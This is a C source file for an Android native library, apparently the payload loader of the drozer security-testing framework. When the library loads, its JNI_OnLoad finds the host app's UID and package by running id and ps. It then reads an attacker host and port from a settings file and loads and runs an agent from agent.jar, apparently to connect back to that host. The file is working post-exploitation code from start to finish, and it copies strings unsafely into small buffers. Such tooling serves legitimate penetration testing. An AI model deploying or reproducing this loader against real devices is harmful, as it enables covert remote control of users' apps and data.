#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <jni.h>
#include <android/log.h>

#define LOG_TAG "com.reversec.dz"

#define LOGD(LOG_TAG, ...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGV(LOG_TAG, ...) __android_log_print(ANDROID_LOG_VERBOSE, LOG_TAG, __VA_ARGS__)
#define LOGE(LOG_TAG, ...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *pvt)
{
    JNIEnv *env;
    (*vm)->AttachCurrentThread(vm, &env, 0);

    jclass theClass, dex_class;
    jmethodID method;
    jobject activityThread, context, objPattern, objMatcher;
    jstring match, pattern, strResult, file_path, jar_file, string_host, package_name;
    jstring agent_class = (*env)->NewStringUTF(env, "com.reversec.dz.Agent");
    const char *result[1035];
    const char *filePath[1024];
    const char *jarFile[1024];
    const char *configFile[1024];
    char *nativeMatch;
    char host[16];
    char portNum[5];
    int port;
    FILE *fp;

    // get (System)Context 
    theClass = (*env)->FindClass(env,"android/app/ActivityThread");
    method = (*env)->GetStaticMethodID(env,theClass,"systemMain","()Landroid/app/ActivityThread;");
    activityThread = (*env)->CallStaticObjectMethod(env,theClass,method);
    theClass = (*env)->FindClass(env,"android/app/ContextImpl");
    method = (*env)->GetStaticMethodID(env,theClass,"createSystemContext","(Landroid/app/ActivityThread;)Landroid/app/ContextImpl;");
    context = (*env)->CallStaticObjectMethod(env,theClass,method,activityThread);

    // get UID
    fp = popen("/system/bin/id", "r");
    while (fgets(result, sizeof(result)-1, fp) != NULL) {
        theClass = (*env)->FindClass(env,"java/util/regex/Pattern");
        method = (*env)->GetStaticMethodID(env,theClass,"compile","(Ljava/lang/String;)Ljava/util/regex/Pattern;");
        char *nativePattern = "(app_\\d+|u0_a\\d+)";
        pattern = (*env)->NewStringUTF(env, nativePattern);
        objPattern = (*env)->CallStaticObjectMethod(env,theClass,method,pattern);
        method = (*env)->GetMethodID(env,theClass,"matcher","(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;");
        strResult = (*env)->NewStringUTF(env, result);
        objMatcher = (*env)->CallObjectMethod(env,objPattern,method,strResult);
        theClass = (*env)->FindClass(env,"java/util/regex/Matcher");
        method = (*env)->GetMethodID(env,theClass,"find","()Z");
        jboolean findBool = (*env)->CallBooleanMethod(env,objMatcher,method);
        method = (*env)->GetMethodID(env,theClass,"group","()Ljava/lang/String;");
        match = (*env)->CallObjectMethod(env,objMatcher,method,1);
        nativeMatch = (*env)->GetStringUTFChars(env, match, 0);
        }
    pclose(fp);

    // get app dir
    fp = popen("/system/bin/ps", "r");
    char *ch;
    while (fgets(result, sizeof(result)-1, fp) != NULL) {
        char *b = strstr(result,nativeMatch);
        if(b){
            theClass = (*env)->FindClass(env,"java/util/regex/Pattern");
            method = (*env)->GetStaticMethodID(env,theClass,"compile","(Ljava/lang/String;)Ljava/util/regex/Pattern;");
            char *nativePattern = "(\\w+\\..*)";
            pattern = (*env)->NewStringUTF(env, nativePattern);
            objPattern = (*env)->CallStaticObjectMethod(env,theClass,method,pattern);
            method = (*env)->GetMethodID(env,theClass,"matcher","(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;");
            strResult = (*env)->NewStringUTF(env, result);
            objMatcher = (*env)->CallObjectMethod(env,objPattern,method,strResult);
            theClass = (*env)->FindClass(env,"java/util/regex/Matcher");
            method = (*env)->GetMethodID(env,theClass,"find","()Z");
            jboolean findBool = (*env)->CallBooleanMethod(env,objMatcher,method);
            method = (*env)->GetMethodID(env,theClass,"group","()Ljava/lang/String;");
            match = (*env)->CallObjectMethod(env,objMatcher,method,1);
            nativeMatch = (*env)->GetStringUTFChars(env, match, 0);
            }
        }
    pclose(fp);

    sprintf(filePath, "/data/data/%s", nativeMatch);
    file_path = (*env)->NewStringUTF(env, filePath);

    LOGD(LOG_TAG, "File path = %s", filePath);

    sprintf(jarFile, "%s/agent.jar", filePath);
    jar_file = (*env)->NewStringUTF(env, jarFile);

    LOGD(LOG_TAG, "JAR path = %s", jarFile);

    package_name = (*env)->NewStringUTF(env,nativeMatch);

    LOGD(LOG_TAG, "Package name = %s", nativeMatch);

    // read in connection params
    sprintf(configFile, "%s/server.settings", filePath);
    FILE *f = fopen(configFile, "rt");

    LOGD(LOG_TAG, "config = %s", configFile);

    char buff[1024];
    fgets(buff, 1024, f);
    fclose(f);
    strcpy(host, strtok(buff,","));
    strcpy(portNum, strtok(NULL,","));
    port = atoi(portNum);
    string_host = (*env)->NewStringUTF(env, host);

    LOGD(LOG_TAG, "host = %s", host);
    LOGD(LOG_TAG, "port = %d", port);

    // class load and execute drozer agent
    jobject class_loader = (*env)->CallObjectMethod(env, context, (*env)->GetMethodID(env, (*env)->GetObjectClass(env, context), "getClassLoader", "()Ljava/lang/ClassLoader;"));
    theClass = (*env)->FindClass(env, "dalvik/system/DexClassLoader");
    jobject dex_loader = (*env)->NewObject(env, theClass, (*env)->GetMethodID(env, theClass, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V"), jar_file, file_path, NULL, class_loader);
    jobject objAgentClass = (*env)->CallObjectMethod(env, dex_loader, (*env)->GetMethodID(env, theClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;"), agent_class);
    method = (*env)->GetMethodID(env, objAgentClass, "<init>", "(Ljava/lang/String;ILjava/lang/String;Landroid/content/Context;)V");
    jobject agentObj = (*env)->NewObject(env, objAgentClass, method, string_host, port, package_name, context);
    method = (*env)->GetMethodID(env,objAgentClass,"run","()V");
    (*env)->CallVoidMethod(env,agentObj,method);
    return JNI_VERSION_1_6;
}
